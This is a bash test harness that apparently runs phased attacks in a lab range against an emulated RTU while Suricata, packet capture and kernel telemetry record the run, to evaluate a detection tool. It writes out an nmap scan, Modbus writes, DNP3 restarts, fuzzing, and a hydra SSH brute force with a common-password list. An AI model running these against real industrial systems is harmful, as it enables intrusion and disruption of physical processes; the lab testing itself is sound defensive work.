#!/usr/bin/env bash
# usage: shirudo/attack.sh <run-id> [phase...]   (run on the Mac; shirudo-arm64 started, shirudo/parseus.sh up)
# One attack run against rtu-s (10.1.1.101) with every view recording. Kali (10.1.1.50) polls rtu-s as the master
# for the whole run (ot_poll.py; NO_POLL=1 skips it); attacks come from a second Kali address, 10.1.1.66, so a peer-based policy can tell
# them apart. Purple runs Suricata on its capture NIC; the phenix VM writes a pcap of the same mirror. After each
# phase rtu-s's shirudo status, kernel-obs tables (drained, so each file covers one phase) and field-device state are
# saved. Phases (default all, in this order):
#   baseline  30 s of polling only
#   recon     nmap SYN + version scan of rtu-s
#   write     Modbus FC5/FC6/FC16 writes            malformed  Modbus #81 cases and unassigned function codes
#   dnp3      DNP3 operate, cold and warm restart   fuzz       300 random Modbus PDUs + 300 random DNP3 frames
#   ssh       hydra, 20 passwords for root, from 10.1.1.66 (a host route; hydra binds no source address)          tamper     root on rtu-s (host-only SSH): shirudo/tools/tamper.sh
# Output: docs/shirudo/raw/<run-id>/ (phases.csv, <n>-<phase>-*.json/txt); shirudo/collect.sh adds the rest.
set -euo pipefail
here=$(cd "$(dirname "$0")" && pwd) repo=$(cd "$(dirname "$0")/.." && pwd)
run=${1:?run-id}; shift
phases=${*:-baseline recon write malformed dnp3 fuzz ssh tamper}
R=$repo/docs/shirudo/raw/$run D=/phenix/shirudo/$(cat "$here/PIN") T=10.1.1.101 A=10.1.1.66
mkdir -p "$R"
L() { limactl shell phenix sudo "$@"; }
S() { L ssh -i "$key" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -p 22110 root@127.0.0.1 "$@"; }
cc() { "$here/cc.sh" "$@"; }
key=$(L mktemp) tmp=$(mktemp -d); trap 'rm -rf "$tmp"; L rm -f "$key"' EXIT
sh_() { printf '%s\n' "$@" > "$tmp/s.sh"; echo "$tmp/s.sh"; }
L install -m600 "$D/vms/rtu-s/ssh/id_ed25519" "$key"

snapshot() {  # <n>-<phase>
  S 'shirudo-runtime status --json' > "$R/$1-status.json" 2>&1 || true
  for t in exec net listen socket priv file dns; do
    S "shirudo-runtime upatch map kernel-obs $t --json" > "$R/$1-kobs-$t.json" 2>&1 || true
  done
  S 'systemctl is-active ferrofire-rtu; pgrep -a ferrofire; ss -ltnH | grep -E ":(502|20000) "; tail -5 /var/log/ferrofire-watch.log' > "$R/$1-fd.txt" 2>&1 || true
}

# setup: attacker alias, master poll (NO_POLL=1: none, so the DNP3 outstation's single master session is free for the
# attacker), Suricata, pcap
poll_cmd="nohup python3 /root/shirudo-tools/ot_poll.py $T 7200 /root/$run-poll.csv >/dev/null 2>&1 & echo poll started"
[ "${NO_POLL:-0}" = 1 ] && poll_cmd="echo no master poll; : > /root/$run-poll.csv"
cc kali "$(sh_ "rm -f /root/$run-attack.csv /root/$run-poll.csv" 'mkdir -p /root/shirudo-tools && cp ./ot_poll.py ./ot_attack.py /root/shirudo-tools/' 'pkill -f [o]t_poll.py; ip addr add 10.1.1.66/24 dev eth0 2>/dev/null; ip -br a show eth0' \
  "$poll_cmd")" \
  "$here/tools/ot_poll.py" "$here/tools/ot_attack.py" > "$R/setup-kali.txt"
cc purple "$(sh_ 'mkdir -p /root/suri && cat ./shirudo.rules /etc/suricata/rules/modbus-events.rules /etc/suricata/rules/dnp3-events.rules /etc/suricata/rules/decoder-events.rules > /root/suri/all.rules 2>/dev/null' \
  '[ -s /var/run/suricata.pid ] && kill $(cat /var/run/suricata.pid) 2>/dev/null; sleep 3; rm -f /var/run/suricata.pid /root/suri/eve.json /root/suri/fast.log' \
  'suricata -D -i eth1 -S /root/suri/all.rules -l /root/suri --set app-layer.protocols.modbus.enabled=yes --set app-layer.protocols.dnp3.enabled=yes --set vars.address-groups.HOME_NET=[10.1.1.0/24] >/root/suri/start.log 2>&1' \
  'sleep 8; tail -2 /root/suri/suricata.log 2>/dev/null; pgrep -a -f "suricata -D" | head -1')" "$here/tools/shirudo.rules" > "$R/setup-purple.txt"
tap=$(L docker exec minimega mm namespace shirudo-arm64 .columns name,tap vm info 2>/dev/null | awk -F'|' '$2 ~ /^ *purple *$/ {print $3}' | tr -d '[] ' | cut -d, -f2)
P=/var/lib/shirudo-range/pcap
L sh -c "mkdir -p $P; [ -s $P/tcpdump.pid ] && kill \$(cat $P/tcpdump.pid) 2>/dev/null; rm -f $P/tcpdump.pid"
L sh -c "setsid nohup tcpdump -ni $tap -s 0 -w $P/$run.pcap </dev/null >/dev/null 2>&1 & echo \$! > $P/tcpdump.pid"
# shirudo-map-export.timer drains every upatch table about every 10 s (and fails: no collector here), so a read after
# a phase would only see the last few seconds. Stop it for the run (collect.sh starts it again); the setup snapshot
# drains once, so each phase's files cover that phase.
S 'systemctl stop shirudo-map-export.timer; systemctl is-active shirudo-map-export.timer || true' > "$R/setup-rtu.txt" 2>&1
echo "phase,start,end" > "$R/phases.csv"
snapshot 0-setup

n=0
for p in $phases; do
  n=$((n + 1)); t0=$(date +%s.%N)
  case $p in
  baseline) sleep 30 ;;
  recon)  cc kali "$(sh_ "nmap -sS -sV --version-light -Pn -S $A -e eth0 -p 1-1024,1883,2404,4840,20000,44818 $T")" > "$R/$n-recon-nmap.txt" ;;
  write|malformed|dnp3|fuzz)
          cc kali "$(sh_ "python3 /root/shirudo-tools/ot_attack.py $p $T /root/$run-attack.csv --src $A" "grep ',$p,' /root/$run-attack.csv")" > "$R/$n-$p-results.csv" ;;
  ssh)    cc kali "$(sh_ 'printf "%s\n" root toor admin password sceptre shirudo changeme 123456 rtu modbus dnp3 ubuntu kali scada operator engineer letmein default raspberry pass > /root/pw.txt' \
                       "ip route replace $T/32 dev eth0 src $A" "timeout 120 hydra -l root -P /root/pw.txt -t 4 -W 1 ssh://$T 2>&1 | tail -5" "ip route del $T/32 dev eth0 src $A")" > "$R/$n-ssh-hydra.txt" ;;
  tamper) S 'sh -s' < "$here/tools/tamper.sh" > "$R/$n-tamper.txt" 2>&1 || true ;;
  *) echo "unknown phase $p" >&2; exit 2 ;;
  esac
  t1=$(date +%s.%N)
  echo "$p,$t0,$t1" >> "$R/phases.csv"
  snapshot "$n-$p"
  echo "phase $p done ($(printf '%.0f' "$(echo "$t1 - $t0" | bc)") s)"
done
echo "run $run: $R (now run shirudo/collect.sh $run)"
